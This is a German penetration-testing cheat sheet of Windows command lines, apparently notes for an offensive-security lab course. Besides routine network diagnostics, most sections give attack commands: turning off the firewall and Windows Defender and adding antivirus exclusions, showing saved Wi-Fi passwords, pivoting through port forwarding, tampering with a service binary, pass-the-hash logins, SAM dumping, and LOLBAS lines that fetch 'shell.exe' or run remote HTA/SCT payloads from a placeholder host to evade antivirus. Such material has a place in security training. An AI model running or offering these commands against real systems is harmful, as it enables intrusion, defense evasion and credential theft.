# Windows Networking

## IP & Netzwerk

```cmd
ipconfig                              # IP-Adressen
ipconfig /all                         # alle Details (DNS, MAC, Gateway)
ipconfig /flushdns                    # DNS-Cache leeren
arp -a                                # ARP-Tabelle (bekannte Hosts im Netz)
netstat -ano                          # alle Verbindungen + PID
netstat -ano | findstr "LISTEN"       # nur lauschende Ports
ping 10.10.10.10                      # Erreichbarkeit prüfen
tracert 10.10.10.10                   # Route verfolgen
nslookup megacorpone.com              # DNS-Abfrage
```

## Firewall – netsh

```cmd
# Status anzeigen
netsh advfirewall show allprofiles

# Alle Profile deaktivieren (braucht Admin!)
netsh advfirewall set allprofiles state off

# Einzelne Profile deaktivieren
netsh advfirewall set domainprofile state off
netsh advfirewall set privateprofile state off
netsh advfirewall set publicprofile state off

# Firewall wieder aktivieren
netsh advfirewall set allprofiles state on

# Port-Weiterleitung (Pivoting)
netsh interface portproxy add v4tov4 listenport=4444 connectaddress=<ip> connectport=4444
```

## Wireless

```cmd
netsh wlan show profile                        # alle gespeicherten WLAN-Profile
netsh wlan show profile name="HomeNetwork" key=clear   # WLAN-Passwort anzeigen
```

## Windows Defender deaktivieren

```powershell
# Echtzeit-Schutz deaktivieren (Admin nötig)
Set-MpPreference -DisableRealtimeMonitoring $true
Set-MpPreference -DisableIOAVProtection $true

# Ausnahmen hinzufügen
Add-MpPreference -ExclusionPath "C:\Windows\Temp"
Add-MpPreference -ExclusionExtension ".exe"

# Status prüfen
Get-MpComputerStatus | Select RealTimeProtectionEnabled
```

```cmd
# Via Registry (persistent nach Neustart)
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender" /v DisableAntiSpyware /t REG_DWORD /d 1 /f

# Via Service
sc stop WinDefend
sc config WinDefend start= disabled
```

## iphlpsvc – IP Helper Service

```cmd
sc qc iphlpsvc
# Zeigt: BINARY_PATH_NAME, START_TYPE, DEPENDENCIES
# Prüfen: unquoted Pfad? Beschreibbares Binary?
# START_TYPE: AUTO_START → läuft automatisch als SYSTEM

sc stop iphlpsvc
sc start iphlpsvc    # nach Manipulation des Binaries
```

## Remote Verbindungen

```cmd
# RDP (Remote Desktop)
mstsc /v:10.10.10.10           # RDP Client starten

# WinRM / Evil-WinRM (Port 5985)
evil-winrm -i 10.10.10.10 -u Administrator -p password
evil-winrm -i 10.10.10.10 -u Administrator -H <NTLM-Hash>

# PSExec (Impacket)
impacket-psexec Administrator:password@10.10.10.10
impacket-psexec -hashes :<NTLM> Administrator@10.10.10.10

# SMB
net use \\10.10.10.10\share password /user:username
```

## LOLBAS – Living Off the Land (Windows)

> Eigene Windows-Binaries für Angriffe nutzen – kein Upload nötig, unauffällig!
> https://lolbas-project.github.io/

```cmd
# Datei herunterladen
certutil.exe -urlcache -split -f "http://<ip>/shell.exe" C:\Temp\shell.exe
bitsadmin /transfer job /download /priority normal http://<ip>/shell.exe C:\Temp\shell.exe

# Datei Base64 encodieren/decodieren
certutil -encode input.exe output.b64
certutil -decode output.b64 decoded.exe

# Code ausführen (AV-Bypass)
mshta.exe http://<ip>/payload.hta
regsvr32 /s /n /u /i:http://<ip>/file.sct scrobj.dll
rundll32.exe javascript:"\..\mshtml,RunHTMLApplication";...

# System Info
whoami /all
systeminfo
wmic product get name                                    # installierte Software
wmic service get name,displayname,pathname,startmode     # Services
```

## CrackMapExec – Netzwerk-Sweep

```bash
# SMB Login prüfen
crackmapexec smb 10.10.10.0/24 -u admin -p password
crackmapexec smb 10.10.10.10 -u admin -H <NTLM-Hash>    # Pass-the-Hash
crackmapexec smb 10.10.10.10 -u admin -p password --sam  # SAM dumpen
crackmapexec smb 10.10.10.10 -u admin -p password -x "whoami"  # Befehl ausführen
```
